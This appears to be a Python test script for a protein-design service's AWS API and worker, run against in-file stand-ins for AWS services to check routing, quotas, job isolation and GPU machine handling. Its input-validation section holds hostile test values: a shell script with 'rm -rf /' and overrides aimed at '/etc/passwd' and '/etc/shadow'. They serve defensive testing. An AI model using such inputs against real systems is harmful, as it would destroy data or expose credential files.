"""Checks for the AWS side: the Lambda API, and the worker that drains the queue.

    python3 tools/check_cloud.py

Nothing here touches AWS, and boto3 does not have to be installed. Every client
is a stand-in built in this file, which is also the point: the stand-ins are
small enough to read, so what the code is asserted to do to DynamoDB, S3, SQS
and EC2 is written down here in a form you can check against an IAM policy.

The same pattern as the EC2 checks in tools/check_server.py, one layer up.
"""

from __future__ import annotations

import json
import hashlib
import os
import re
import shutil
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tools"))

from proteincad import cloud_api  # noqa: E402
from proteincad import colab_worker as cw  # noqa: E402
from proteincad.api import ApiError  # noqa: E402

passed = 0
failed = 0


def check(label: str, condition: bool, detail: str = "") -> None:
    global passed, failed
    suffix = f"  ({detail})" if detail else ""
    if condition:
        passed += 1
        print(f"  ok   {label}{suffix}")
    else:
        failed += 1
        print(f"  FAIL {label}{suffix}")


def section(title: str) -> None:
    print(f"\n{title}")


from fake_aws import (  # noqa: E402
    Boom, FakeDynamo, FakeEc2, FakeS3, FakeSqs, NoCapacity, _plain, _value)

# ================================================================ the world


TARGET = (ROOT / "data" / "samples" / "1crn.pdb").read_text()

ENVIRONMENT = {
    "PROTEINCAD_TABLE": "proteincad-jobs",
    "PROTEINCAD_BUCKET": "proteincad-data",
    "PROTEINCAD_QUEUE": "https://sqs.example/queue",
    "PROTEINCAD_INSTANCE": "i-0abc123",
    "PROTEINCAD_REGION": "us-east-1",
    "PROTEINCAD_MAX_DESIGNS": "8",
    "PROTEINCAD_DAILY_JOBS": "3",
    "PROTEINCAD_CONCURRENT_JOBS": "2",
    "PROTEINCAD_GLOBAL_DAILY_JOBS": "5",
    "PROTEINCAD_FUNCTION": "submit",
    "PROTEINCAD_LAUNCH_TEMPLATE": "lt-0abc123",
    "PROTEINCAD_SUBNETS": "subnet-a,subnet-b,subnet-c",
    "PROTEINCAD_INSTANCE_TYPE": "g4dn.xlarge",
    "PROTEINCAD_MACHINE_STARTS": "5",
    "PROTEINCAD_GLOBAL_DAILY_LAUNCHES": "20",
    "PROTEINCAD_IDLE_MINUTES": "30",
}


class World:
    """One set of stand-ins, wired in and torn down again."""

    def __init__(self, full=(), over_quota=False, **overrides):
        self.dynamo = FakeDynamo()
        self.s3 = FakeS3()
        self.sqs = FakeSqs()
        self.ec2 = FakeEc2(full=full, over_quota=over_quota)
        self.before = dict(os.environ)
        os.environ.update(ENVIRONMENT)
        os.environ.update(overrides)
        cloud_api.reset_clients()
        cloud_api.set_client("dynamodb", self.dynamo)
        cloud_api.set_client("s3", self.s3)
        cloud_api.set_client("sqs", self.sqs)
        cloud_api.set_client("ec2", self.ec2)

    def close(self):
        os.environ.clear()
        os.environ.update(self.before)
        cloud_api.reset_clients()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()
        return False

    # -- driving the api --------------------------------------------------

    def call(self, method, path, body=None, user="user-one", function=None):
        os.environ["PROTEINCAD_FUNCTION"] = function or ENVIRONMENT["PROTEINCAD_FUNCTION"]
        event = {
            "version": "2.0",
            "rawPath": path,
            "requestContext": {
                "http": {"method": method, "path": path},
                "stage": "$default",
                "authorizer": {"jwt": {"claims": {"sub": user} if user else {}}},
            },
            "body": json.dumps(body) if body is not None else None,
            "isBase64Encoded": False,
        }
        answer = cloud_api.handler(event, None)
        answer["json"] = json.loads(answer["body"])
        return answer

    def jobs_in_table(self):
        return [cloud_api.item_to_dict(item) for key, item in self.dynamo.items.items()
                if key[0].startswith("JOB#")]

    def counter(self, pk, kind="QUOTA"):
        item = self.dynamo.items.get((pk, kind + "#" + cloud_api.today()))
        return int(_value(item, "jobs") or 0) if item else 0

    def machine_is(self, state, **fields):
        """Plant a machine record, as if one had been started."""
        fields.setdefault("heartbeat", cloud_api.now())
        fields.setdefault("instance_id", "i-000000000001")
        fields.setdefault("zone", "subnet-az")
        self.dynamo.update_item(
            TableName="proteincad-jobs", Key=cloud_api.machine_key(),
            **cloud_api.set_fields(state=state, **fields))

    def model_is(self, name, state, **fields):
        """Plant a model record. Stamped with whichever machine is current
        unless the caller names another -- which is what the real worker does,
        and what makes a previous machine's record distinguishable."""
        if "instance_id" not in fields:
            current = cloud_api.item_to_dict(
                self.dynamo.items.get(("MACHINE", "STATE"), {}))
            fields["instance_id"] = current.get("instance_id", "")
        self.dynamo.update_item(
            TableName="proteincad-jobs", Key=cloud_api.model_key(name),
            **cloud_api.set_fields(state=state, **fields))


def spec(**overrides):
    base = {
        "version": 1,
        "kind": "binder",
        "mode": "binder",
        "model": "mock",
        "target": {"name": "1crn", "pdb": TARGET, "hotspots": ["A22", "A23"]},
        "binder": {"contigs": "", "lengthMin": 40, "lengthMax": 60},
        "run": {"numDesigns": 2, "seed": 1},
    }
    for key, value in overrides.items():
        if isinstance(value, dict) and isinstance(base.get(key), dict):
            base[key] = {**base[key], **value}
        else:
            base[key] = value
    return base


# ==================================================================== checks

print("proteinCAD cloud checks")

section("the routers")
with World() as world:
    everywhere = [(method, pattern.pattern)
                  for router in cloud_api.ROUTERS.values()
                  for method, pattern, _ in router.routes]
    check("no route can start the GPU",
          not any("gpu/start" in pattern for _, pattern in everywhere))
    check("no route can stop the GPU",
          not any("gpu/stop" in pattern for _, pattern in everywhere))
    costly = {(method, pattern.pattern) for method, pattern, _ in cloud_api.SUBMIT.routes}
    check("the routes that spend money or change the machine are on their own function",
          costly == {("POST", "^/design$"),
                     ("POST", "^/jobs/(?P<job_id>[^/]+)/designs/(?P<index>[^/]+)/fold$"),
                     ("POST", "^/machine/start$"),
                     ("POST", "^/machine/retire$"),
                     ("POST", "^/machine/models/(?P<name>[^/]+)$")},
          str(sorted(costly)))
    check("and the read function cannot retire a machine either",
          world.call("POST", "/machine/retire", {}, function="api")["statusCode"] == 404)
    check("and the read function cannot start a machine",
          world.call("POST", "/machine/start", {}, function="api")["statusCode"] == 404)
    check("the read function cannot reach /design",
          world.call("POST", "/design", spec(), function="api")["statusCode"] == 404)
    check("the submit function cannot reach /jobs",
          world.call("GET", "/jobs", function="submit")["statusCode"] == 404)
    check("an unknown PROTEINCAD_FUNCTION is a 500, not a guess",
          world.call("GET", "/health", function="nonsense")["statusCode"] == 500)

section("health, which needs no token")
with World() as world:
    answer = world.call("GET", "/health", user=None, function="api")
    check("answers without a signed-in user", answer["statusCode"] == 200)
    check("names the runner the panel should offer",
          answer["json"]["runners"] == ["ec2"])
    check("says the deployment is hosted", answer["json"]["hosted"] is True)
    check("asks the panel for a sign-in control", answer["json"]["auth"] == "cognito")
    check("mentions nobody's jobs", "jobs" not in answer["json"])
    check("sends no CORS header of its own",
          not any(key.lower().startswith("access-control") for key in answer["headers"]))

section("the option catalogue")
with World() as world:
    answer = world.call("GET", "/design/options", function="api")
    check("serves the same catalogue as the local server",
          len(answer["json"]["options"]) == 44 and len(answer["json"]["modes"]) == 6,
          f"{len(answer['json']['options'])} options, {len(answer['json']['modes'])} modes")
    check("tells the panel the free-form box is off",
          answer["json"]["extra_allowed"] is False)

section("submitting a design")
with World() as world:
    answer = world.call("POST", "/design", spec())
    job = answer["json"]
    check("accepted", answer["statusCode"] == 200, job.get("error", ""))
    check("the job id is not guessable", len(job["id"]) == 32 and job["id"].isalnum())
    check("the shape is the one the viewer already reads",
          set(job) >= {"id", "status", "model", "kind", "mode", "progress", "stage", "total",
                       "error", "created", "elapsed", "target", "hotspots", "designs"})
    check("it starts queued", job["status"] == "queued")
    check("the spec went to S3, not onto the queue",
          ("proteincad-data", f"specs/{job['id']}.json") in world.s3.objects)
    check("the queue message is just a pointer",
          json.loads(world.sqs.messages[0]["Body"]) == {
              "job_id": job["id"], "spec_key": f"specs/{job['id']}.json"})
    check("the record is in DynamoDB", len(world.jobs_in_table()) == 1)
    check("a machine was launched for it", len(world.ec2.launched) == 1)
    stored = json.loads(world.s3.objects[("proteincad-data", f"specs/{job['id']}.json")])
    check("the runner is decided here, not by the caller", stored["model"] == "ec2")
    check("the target the model will see is the one that was sent",
          stored["target"]["pdb"] == TARGET)

section("what a job may ask for")
with World() as world:
    def answers(label, payload, status=400, contains=""):
        answer = world.call("POST", "/design", payload)
        message = answer["json"].get("error", "")
        ok = answer["statusCode"] == status and (not contains or contains in message.lower())
        check(label, ok, f"{answer['statusCode']}: {message[:90]}")

    answers("a structure that is too large is refused by size",
            spec(target={"pdb": "ATOM  " + "x" * (6 * 1024 * 1024)}), 413, "limit")
    answers("something that is not a structure is refused by shape",
            spec(target={"pdb": "#!/bin/sh\nrm -rf /\n" * 40}), 400, "pdb or mmcif")
    answers("a structure with no atoms is refused",
            spec(target={"pdb": "HEADER    NOTHING IN HERE\nEND\n"}), 400, "no atom")
    answers("an unknown protocol is refused",
            spec(mode="teleport"), 400, "protocol")
    answers("a setting outside its range is refused",
            spec(run={"steps": 99999}), 400)
    answers("a setting that is not in the catalogue at all is ignored, not run",
            spec(run={"numDesigns": 2, "inference.output_prefix": "/etc/passwd"}), 200)
    answers("free-form Hydra overrides are refused",
            spec(run={"numDesigns": 1, "extra": ["inference.ckpt_override_path=/etc/shadow"]}),
            400, "free-form")
    answers("a job with no design site is refused",
            spec(target={"hotspots": []}), 400, "design site")

    answer = world.call("POST", "/design", spec(run={"numDesigns": 5000}))
    job = world.jobs_in_table()[-1]
    check("the number of designs is capped, not refused",
          answer["statusCode"] == 200 and job["total"] == 8, f"total={job.get('total')}")

section("quotas")
with World(PROTEINCAD_DAILY_JOBS="2", PROTEINCAD_CONCURRENT_JOBS="9") as world:
    world.call("POST", "/design", spec())
    world.call("POST", "/design", spec())
    answer = world.call("POST", "/design", spec())
    check("the per-user daily cap refuses the third job", answer["statusCode"] == 429)
    check("and says when it comes back", "come back in" in answer["json"]["error"])
    check("the global counter was handed back", world.counter("GLOBAL") == 2,
          f"global={world.counter('GLOBAL')}")
    check("only two jobs exist", len(world.jobs_in_table()) == 2)

with World(PROTEINCAD_GLOBAL_DAILY_JOBS="1", PROTEINCAD_CONCURRENT_JOBS="9") as world:
    world.call("POST", "/design", spec(), user="user-one")
    answer = world.call("POST", "/design", spec(), user="user-two")
    check("the global cap refuses a second user's job", answer["statusCode"] == 429)
    check("and says the limit is shared", "everyone" in answer["json"]["error"])
    check("the refused user was not charged for it",
          world.counter("USER#user-two") == 0)

with World(PROTEINCAD_CONCURRENT_JOBS="1") as world:
    world.call("POST", "/design", spec())
    answer = world.call("POST", "/design", spec())
    check("the concurrency cap refuses the second job", answer["statusCode"] == 429)
    check("both counters were handed back",
          world.counter("GLOBAL") == 1 and world.counter("USER#user-one") == 1,
          f"global={world.counter('GLOBAL')} user={world.counter('USER#user-one')}")

with World() as world:
    world.call("POST", "/design", spec(mode="teleport"))
    check("a job refused for being malformed costs nobody a slot",
          world.counter("GLOBAL") == 0 and world.counter("USER#user-one") == 0)

section("other people's jobs")
with World(PROTEINCAD_CONCURRENT_JOBS="9") as world:
    mine = world.call("POST", "/design", spec(), user="user-one")["json"]["id"]
    theirs = world.call("POST", "/design", spec(), user="user-two")["json"]["id"]

    listing = world.call("GET", "/jobs", user="user-one", function="api")["json"]
    check("a listing shows only the caller's jobs",
          [job["id"] for job in listing["jobs"]] == [mine])
    check("and what is left of their allowance",
          listing["quota"]["used"] == 1 and listing["quota"]["daily"] == 3)

    answer = world.call("GET", f"/jobs/{theirs}", user="user-one", function="api")
    check("somebody else's job reads as missing, not as forbidden",
          answer["statusCode"] == 404 and "no job" in answer["json"]["error"])
    answer = world.call("GET", f"/jobs/{theirs}/designs/0", user="user-one", function="api")
    check("and so does a design inside it", answer["statusCode"] == 404)
    answer = world.call("POST", f"/jobs/{theirs}/cancel", user="user-one", function="api")
    check("and cancelling it is refused", answer["statusCode"] == 404)
    answer = world.call("POST", f"/jobs/{theirs}/designs/0/fold", {}, user="user-one")
    check("and so is folding it", answer["statusCode"] == 404)

section("results come back as short-lived links")
with World() as world:
    job_id = world.call("POST", "/design", spec())["json"]["id"]
    # Stand in for the worker having finished.
    world.s3.objects[("proteincad-data", f"results/{job_id}/design_000.pdb")] = TARGET.encode()
    world.dynamo.update_item(
        TableName="proteincad-jobs", Key=cloud_api.job_key(job_id),
        **cloud_api.set_fields(status="done", progress=1, designs=[
            {"name": "design_1", "metrics": {"residues": 46}, "atoms": 327,
             "key": f"results/{job_id}/design_000.pdb"}]))

    answer = world.call("GET", f"/jobs/{job_id}/designs/0", function="api")
    check("a design answers with a link and a name",
          answer["statusCode"] == 200 and "url" in answer["json"]
          and answer["json"]["name"] == "design_1")
    check("the link expires", world.s3.signed[0][2] == 300, str(world.s3.signed[0]))
    check("the link is for that design and nothing else",
          world.s3.signed[0][1] == f"results/{job_id}/design_000.pdb")
    check("the bucket key is not handed to the browser",
          "key" not in world.call("GET", f"/jobs/{job_id}",
                                  function="api")["json"]["designs"][0])
    check("a design that does not exist is a 404",
          world.call("GET", f"/jobs/{job_id}/designs/9", function="api")["statusCode"] == 404)
    check("a design index that is not a number is a 400",
          world.call("GET", f"/jobs/{job_id}/designs/x", function="api")["statusCode"] == 400)

section("cancelling")
with World(PROTEINCAD_CONCURRENT_JOBS="9") as world:
    queued = world.call("POST", "/design", spec())["json"]["id"]
    answer = world.call("POST", f"/jobs/{queued}/cancel", function="api")
    check("a queued job is cancelled outright", answer["json"]["status"] == "cancelled")

    running = world.call("POST", "/design", spec())["json"]["id"]
    world.dynamo.update_item(TableName="proteincad-jobs", Key=cloud_api.job_key(running),
                             **cloud_api.set_fields(status="running"))
    answer = world.call("POST", f"/jobs/{running}/cancel", function="api")
    check("a running job is flagged, for the worker to notice",
          answer["json"]["status"] == "running"
          and _value(world.dynamo.items[("JOB#" + running, "JOB")], "cancel") is True)

    done = world.call("POST", "/design", spec())["json"]["id"]
    world.dynamo.update_item(TableName="proteincad-jobs", Key=cloud_api.job_key(done),
                             **cloud_api.set_fields(status="done"))
    before = len(world.dynamo.calls)
    world.call("POST", f"/jobs/{done}/cancel", function="api")
    check("cancelling a finished job writes nothing",
          not any(call[0] == "update_item" for call in world.dynamo.calls[before:]))

section("the second stage")
with World(PROTEINCAD_CONCURRENT_JOBS="9") as world:
    job_id = world.call("POST", "/design", spec())["json"]["id"]
    backbone = "\n".join(
        "ATOM  %5d  CA  GLY A%4d    %8.3f%8.3f%8.3f  1.00  0.00           C"
        % (i + 1, i + 1, i * 3.8, 0.0, 0.0) for i in range(24))
    world.s3.objects[("proteincad-data", f"results/{job_id}/design_000.pdb")] = \
        (backbone + "\nEND\n").encode()
    world.dynamo.update_item(
        TableName="proteincad-jobs", Key=cloud_api.job_key(job_id),
        **cloud_api.set_fields(status="done", progress=1, designs=[
            {"name": "design_1", "metrics": {}, "atoms": 24,
             "key": f"results/{job_id}/design_000.pdb"}]))

    answer = world.call("POST", f"/jobs/{job_id}/designs/0/fold", {"numDesigns": 4})
    check("a fold is accepted", answer["statusCode"] == 200, answer["json"].get("error", ""))
    fold = answer["json"]
    check("it is a second job, not a change to the first", fold["id"] != job_id)
    check("and it knows it is a fold", fold["kind"] == "fold")
    stored = json.loads(world.s3.objects[("proteincad-data", f"specs/{fold['id']}.json")])
    check("the complex was built here from the target and the backbone",
          stored["complex"]["pdb"].count("ATOM") > 24)
    check("it remembers which design it came from",
          stored["source"]["job"] == job_id and stored["source"]["design"] == 0)
    check("a fold is charged like any other GPU job", world.counter("USER#user-one") == 2)

section("when AWS will not play")
with World() as world:
    world.sqs.fail = True
    answer = world.call("POST", "/design", spec())
    check("a queue that refuses the message is a 502", answer["statusCode"] == 502)
    stranded = world.jobs_in_table()
    check("the job is marked failed rather than left queued forever",
          len(stranded) == 1 and stranded[0]["status"] == "failed",
          stranded[0]["status"] if stranded else "no record")
    check("and it says why", "could not be queued" in (stranded[0]["error"] if stranded else ""))
    check("the caller is not charged for it", world.counter("USER#user-one") == 0)

with World() as world:
    class Sulking:
        def start_instances(self, **_):
            raise Boom("UnauthorizedOperation")

        def __getattr__(self, name):
            raise Boom(name)

    cloud_api.set_client("ec2", Sulking())
    answer = world.call("POST", "/design", spec())
    check("an instance that will not start does not lose the job",
          answer["statusCode"] == 200 and len(world.jobs_in_table()) == 1)
    check("and the message is on the queue for the five-minute waker to find",
          len(world.sqs.messages) == 1)

section("the machine: starting one")
with World() as world:
    view = world.call("GET", "/machine", function="api")["json"]
    check("with nothing running, the machine is gone", view["state"] == "gone")
    check("and nothing was launched to find that out", world.ec2.launched == [])
    check("every model reads as absent",
          [m["state"] for m in view["models"]] == ["absent"] * len(cw.MODELS))
    # Retiring is not stopping. The panel may offer to ask a machine to stand
    # down at a moment of its own choosing; it may never be given a way to end
    # one under somebody else's running job, and nothing in the account has the
    # permission to do that anyway.
    check("the panel is told there is no stop button and no terminate",
          view["controls"]["stop"] is False and view["controls"]["terminate"] is False,
          str(view["controls"]))
    check("but it may ask a machine to retire",
          view["controls"]["retire"] is True)

    answer = world.call("POST", "/machine/start")
    check("starting one works", answer["statusCode"] == 200, answer["json"].get("error", ""))
    check("exactly one instance was launched", len(world.ec2.launched) == 1)
    check("in the first zone that had room", world.ec2.launched[0]["SubnetId"] == "subnet-a")
    check("from the configured launch template",
          world.ec2.launched[0]["LaunchTemplate"]["LaunchTemplateId"] == "lt-0abc123")
    check("and it was tagged",
          {"Key": "proteincad:role", "Value": "worker"} in world.ec2.launched[0]["Tags"])
    check("the record says booting", answer["json"]["state"] == "booting")
    check("and names the instance", answer["json"]["instance"] == "i-000000000001")

    again = world.call("POST", "/machine/start", user="user-two")
    check("somebody else pressing Start does not launch a second one",
          len(world.ec2.launched) == 1)
    check("they are shown the machine that is already there",
          again["json"]["instance"] == "i-000000000001")
    check("and it did not cost them a start", world.counter("USER#user-two", "STARTS") == 0)

section("a machine that died without saying so can be replaced")
with World() as world:
    # An instance that goes away without announcing it -- a crash, a hardware
    # fault, a terminate-instances by hand -- leaves the record saying `ready`
    # with a heartbeat that simply stops. live() calls that dead after
    # MACHINE_STALE, so the panel shows `gone` and offers a Start button.
    #
    # The launch lock used to hold its own, longer rule (LAUNCH_STALE), so for
    # the eight minutes between the two thresholds that button did nothing at
    # all and said nothing either: no launch, no error, a payload that still
    # read `gone`. The two rules are now one.
    world.machine_is("ready", heartbeat=cloud_api.now() - (cloud_api.MACHINE_STALE + 30))
    view = world.call("GET", "/machine", function="api")["json"]
    check("the panel is told the machine is gone", view["state"] == "gone", view["state"])

    answer = world.call("POST", "/machine/start")
    check("and pressing Start actually launches one",
          len(world.ec2.launched) == 1, str(len(world.ec2.launched)))
    check("the answer says booting rather than gone",
          answer["json"]["state"] == "booting", answer["json"]["state"])

    # The other side of the same rule: a record live() still believes in must
    # not be launched over, or a slow heartbeat becomes a second GPU.
    with World() as busy:
        busy.machine_is("ready", heartbeat=cloud_api.now() - 5)
        busy.call("POST", "/machine/start")
        check("a machine still beating is not replaced", len(busy.ec2.launched) == 0,
              str(len(busy.ec2.launched)))

section("weights left behind by a machine that is gone")
with World() as world:
    # The machine running now is not the one that downloaded these. Its instance
    # store was created empty minutes ago, so nothing is on it -- whatever the
    # records say.
    world.machine_is("ready", instance_id="i-000000000002")
    world.model_is("rfdiffusion", "ready", instance_id="i-000000000001")

    view = world.call("GET", "/machine", function="api")["json"]
    rfdiffusion = next(m for m in view["models"] if m["id"] == "rfdiffusion")
    check("the panel does not claim weights that went with the old disk",
          rfdiffusion["state"] == "absent", rfdiffusion["state"])

    # And the button it therefore offers has to work. want_model used to read
    # the raw record -- `ready` -- and return without writing, so the press did
    # nothing at all: no download, no error, and a row that stayed `absent`
    # for ever while the panel said it had asked.
    world.call("POST", "/machine/models/rfdiffusion")
    after = world.call("GET", "/machine", function="api")["json"]
    asked = next(m for m in after["models"] if m["id"] == "rfdiffusion")
    check("and pressing Download actually asks for it",
          asked["state"] == "wanted", asked["state"])
    check("stamped with the machine it was asked of, so it stays visible",
          _value(world.dynamo.items[("MACHINE", "MODEL#rfdiffusion")], "instance_id")
          == "i-000000000002")

section("two people at once get one machine")
with World() as world:
    # The race, made deterministic: both callers read "no machine", then both
    # try to take the lock. Only the conditional write can decide.
    seen = []
    real = cloud_api.read_machine
    stale = {"state": {}}

    def frozen():
        seen.append(1)
        return stale if len(seen) <= 2 else real()

    cloud_api.read_machine = frozen
    try:
        first = world.call("POST", "/machine/start", user="user-one")
        second = world.call("POST", "/machine/start", user="user-two")
    finally:
        cloud_api.read_machine = real

    check("both calls succeeded",
          first["statusCode"] == 200 and second["statusCode"] == 200)
    check("but only one instance exists", len(world.ec2.launched) == 1,
          str(len(world.ec2.launched)))
    check("and only one of them was charged a start",
          world.counter("USER#user-one", "STARTS") + world.counter("USER#user-two", "STARTS") == 1)

section("an account limit, which is not a zone with no room")
with World(over_quota=True) as world:
    answer = world.call("POST", "/machine/start")
    check("the account limit is a 429, not a 500", answer["statusCode"] == 429,
          str(answer["statusCode"]))
    message = answer["json"]["error"]
    check("and it says the retry will not help on its own",
          "will not help" in message, message[:80])
    check("it names the quota to raise and what it is counted in",
          "Running On-Demand G and VT instances" in message and "vCPUs" in message)
    check("it mentions the instance that is still shutting down, which is the usual cause",
          "shutting down" in message)
    check("and it says what headroom would stop it happening",
          "8 lets a replacement start" in message, message[-90:])

with World(over_quota=True) as world:
    # The other case, and the one the panel could not tell apart before: a
    # machine that has just gone is a wait, not a support request. The worker
    # announces GONE on its way down, so the record knows -- no call to EC2.
    world.machine_is("gone", heartbeat=cloud_api.now() - 40, instance_id="")
    answer = world.call("POST", "/machine/start")
    message = answer["json"]["error"]
    check("a machine that has just gone is reported as a wait",
          "not finished terminating" in message, message[:70])
    check("and it says how long ago, so the wait has a shape",
          "40s ago" in message, message[:160])
    check("it does not send them to Service Quotas for a wait",
          "nothing needs changing" in message)

with World(over_quota=True) as world:
    # The state the record is actually in when somebody presses Start twice
    # while one instance is shutting down: the first press failed, so the
    # record says `failed`, not `gone`. That is exactly when the hint is
    # wanted, and it used to be exactly when it did not appear.
    world.machine_is("failed", heartbeat=cloud_api.now() - 30, instance_id="")
    message = world.call("POST", "/machine/start")["json"]["error"]
    check("a Start refused moments ago also reads as a wait",
          "not finished terminating" in message, message[:70])

with World(over_quota=True) as world:
    # A goodbye from last week is not this launch's problem.
    world.machine_is("gone", heartbeat=cloud_api.now() - 100000, instance_id="")
    message = world.call("POST", "/machine/start")["json"]["error"]
    check("an old goodbye is not mistaken for a machine on its way out",
          "has not finished terminating" not in message, message[:70])
    # One zone, not three: the limit is on the account, so the other two have
    # exactly the same answer and trying them is pure latency.
    check("only one zone was tried, because the others would say the same",
          len([c for c in world.ec2.calls if c[0] == "run"]) == 1,
          str(world.ec2.calls))
    check("nothing was launched", world.ec2.launched == [])
    check("and the start was refunded", world.counter("USER#user-one", "STARTS") == 0)

section("a zone with no room")
with World(full={"subnet-a"}) as world:
    world.call("POST", "/machine/start")
    check("a full zone is tried and passed over",
          [c for c in world.ec2.calls if c[0] == "run"] == [("run", "subnet-a"), ("run", "subnet-b")])
    check("and the instance lands in the next one",
          world.ec2.launched[0]["SubnetId"] == "subnet-b")

with World(full={"subnet-a", "subnet-b"}) as world:
    world.call("POST", "/machine/start")
    check("two full zones still ends in a machine",
          len(world.ec2.launched) == 1 and world.ec2.launched[0]["SubnetId"] == "subnet-c")

with World(full={"subnet-a", "subnet-b", "subnet-c"}) as world:
    answer = world.call("POST", "/machine/start")
    check("all zones full is a 503, not a 500", answer["statusCode"] == 503)
    check("and the message says it is AWS being full, not us",
          "to spare in any of the 3 zones" in answer["json"]["error"]
          and "Nothing is wrong here" in answer["json"]["error"],
          answer["json"]["error"][:100])
    check("the panel can still explain it after a reload",
          "to spare" in world.call("GET", "/machine", function="api")["json"]["error"])
    check("nothing was launched", world.ec2.launched == [])
    check("never at a different instance type",
          all(not c["Overrides"] for c in world.ec2.launched))
    check("the start was refunded", world.counter("USER#user-one", "STARTS") == 0)
    check("and so was the global one", world.counter("MACHINE", "LAUNCHES") == 0)
    check("the lock was released, so the next press may try again",
          world.call("POST", "/machine/start")["statusCode"] == 503)

section("a machine that went away")
with World() as world:
    world.machine_is("ready", heartbeat=cloud_api.now())
    world.model_is("rfdiffusion", "ready", bytes=3_900_000_000, total=3_900_000_000)
    view = world.call("GET", "/machine", function="api")["json"]
    check("a machine that is beating reads as ready", view["state"] == "ready")
    check("and a downloaded model reads as ready",
          [m for m in view["models"] if m["id"] == "rfdiffusion"][0]["state"] == "ready")

    # Weights sit on the instance store, which dies with the instance. The
    # records do not, so a new machine used to inherit the last one's claims
    # and report a full set of models on a disk created empty a minute ago.
    world.machine_is("ready", instance_id="i-old")
    world.model_is("rfdiffusion", "ready", bytes=1, total=1, instance_id="i-old")
    check("a model downloaded by THIS machine reads as ready",
          [m for m in world.call("GET", "/machine", function="api")["json"]["models"]
           if m["id"] == "rfdiffusion"][0]["state"] == "ready")

    world.machine_is("ready", instance_id="i-new")
    view = world.call("GET", "/machine", function="api")["json"]
    check("a model the PREVIOUS machine downloaded does not",
          [m for m in view["models"] if m["id"] == "rfdiffusion"][0]["state"] == "absent",
          "its disk was destroyed with the instance")
    check("and its byte count goes with it",
          [m for m in view["models"] if m["id"] == "rfdiffusion"][0]["bytes"] == 0)

    world.machine_is("ready", heartbeat=cloud_api.now() - 600)
    view = world.call("GET", "/machine", function="api")["json"]
    check("one that stopped beating reads as gone, not as ready", view["state"] == "gone")

    # A boot is held to a looser rule than a running worker, but it is still a
    # rule about beats rather than a guess at how long a boot takes. The boot
    # script beats every twenty seconds for its whole length -- the steps are
    # minutes apart, so without that the record would go untouched through the
    # image pull and the only thing keeping a healthy machine alive would be a
    # window long enough to cover the slowest boot imaginable. Which is also
    # how long a boot that had actually died went on looking like one that had
    # not: terminate a booting instance and the panel insisted for ten minutes.
    world.machine_is("booting", heartbeat=cloud_api.now() - 200)
    check("a boot that is still beating is still booting",
          world.call("GET", "/machine", function="api")["json"]["state"] == "booting")
    world.machine_is("booting", heartbeat=cloud_api.now() - 60)
    check("and one beating a moment ago certainly is",
          world.call("GET", "/machine", function="api")["json"]["state"] == "booting")
    # Twelve missed beats. Something has gone, and saying so is what puts the
    # Start button back in reach rather than making somebody wait out a boot
    # that is not happening.
    world.machine_is("booting", heartbeat=cloud_api.now() - 300)
    check("a boot that has stopped beating reads as gone within a few minutes",
          world.call("GET", "/machine", function="api")["json"]["state"] == "gone")
    world.machine_is("booting", heartbeat=cloud_api.now() - 900)
    check("and one that never finished certainly does",
          world.call("GET", "/machine", function="api")["json"]["state"] == "gone")
    world.machine_is("ready", heartbeat=cloud_api.now() - 200)
    check("but a ready machine quiet for three minutes is gone",
          world.call("GET", "/machine", function="api")["json"]["state"] == "gone",
          "only `ready` has something beating behind it")
    check("and its models go with it, because its disk did",
          [m["state"] for m in view["models"]] == ["absent"] * len(cw.MODELS))
    check("so Start is possible again",
          world.call("POST", "/machine/start")["statusCode"] == 200)

section("downloading a model")
with World() as world:
    answer = world.call("POST", "/machine/models/rfdiffusion")
    check("asking with no machine is refused, and says so",
          answer["statusCode"] == 409 and "Start one first" in answer["json"]["error"])

    world.machine_is("booting")
    answer = world.call("POST", "/machine/models/rfdiffusion")
    check("asking while it is still booting is refused", answer["statusCode"] == 409)

    world.machine_is("ready")
    answer = world.call("POST", "/machine/models/rfdiffusion")
    check("asking a ready machine works", answer["statusCode"] == 200)
    # The row must stay changed. Without the instance stamp the API writes a
    # record it then reads back as another machine's, reports the model absent,
    # and the button snaps straight back to "not downloaded".
    asked = [m for m in answer["json"]["models"] if m["id"] == "rfdiffusion"][0]
    check("and the answer already shows it as asked for",
          asked["state"] == "wanted", asked["state"])
    check("as does the next poll",
          [m for m in world.call("GET", "/machine", function="api")["json"]["models"]
           if m["id"] == "rfdiffusion"][0]["state"] == "wanted")
    check("the model is marked wanted, for the worker to pick up",
          _value(world.dynamo.items[("MACHINE", "MODEL#rfdiffusion")], "state") == "wanted")
    check("with a size to show a progress bar against",
          _value(world.dynamo.items[("MACHINE", "MODEL#rfdiffusion")], "total") == 3_900_000_000)

    # What the boot script reports while a machine is coming up. Five minutes
    # of one unchanging word is what made somebody press Start twice.
    world.machine_is("booting", stage="downloading the model software, about 7 GB",
                     step=3, steps=4, launched_at=cloud_api.now() - 90)
    view = world.call("GET", "/machine", function="api")["json"]
    check("a booting machine says which step it is on",
          view["stage"] == "downloading the model software, about 7 GB"
          and view["step"] == 3 and view["steps"] == 4)
    check("and when it started, so the panel can count",
          view["since"] > 0)
    world.machine_is("ready", stage="", step=0, steps=0)
    check("a ready machine is not still reporting a boot step",
          world.call("GET", "/machine", function="api")["json"]["stage"] == "")
    world.machine_is("ready")

    world.model_is("esmfold", "downloading", bytes=1_400_000_000, total=8_500_000_000)
    view = world.call("GET", "/machine", function="api")["json"]
    esmfold = [m for m in view["models"] if m["id"] == "esmfold"][0]
    check("a download in progress reports bytes and a total",
          esmfold["bytes"] == 1_400_000_000 and esmfold["total"] == 8_500_000_000)

    before = len(world.dynamo.calls)
    world.call("POST", "/machine/models/esmfold")
    check("asking for one that is already downloading changes nothing",
          not any(c[0] == "update_item" for c in world.dynamo.calls[before:]))

    answer = world.call("POST", "/machine/models/nonsense")
    check("a model this build has never heard of is a 404", answer["statusCode"] == 404)

section("what each protocol needs")
with World() as world:
    view = world.call("GET", "/machine", function="api")["json"]
    check("every protocol says which models it needs",
          all(view["needs"][mode] == ["rfdiffusion"] for mode in
              ("binder", "motif", "monomer", "symmetry", "partial", "scaffold")),
          json.dumps(view["needs"]))
    check("and stage two says its own two",
          view["fold_needs"] == ["proteinmpnn", "esmfold"])
    check("every model the panel draws a button for is one the worker knows",
          view["known"] == sorted(m["id"] for m in cw.MODELS),
          ", ".join(view["known"]))
    check("the idle timeout is reported, because the panel promises it",
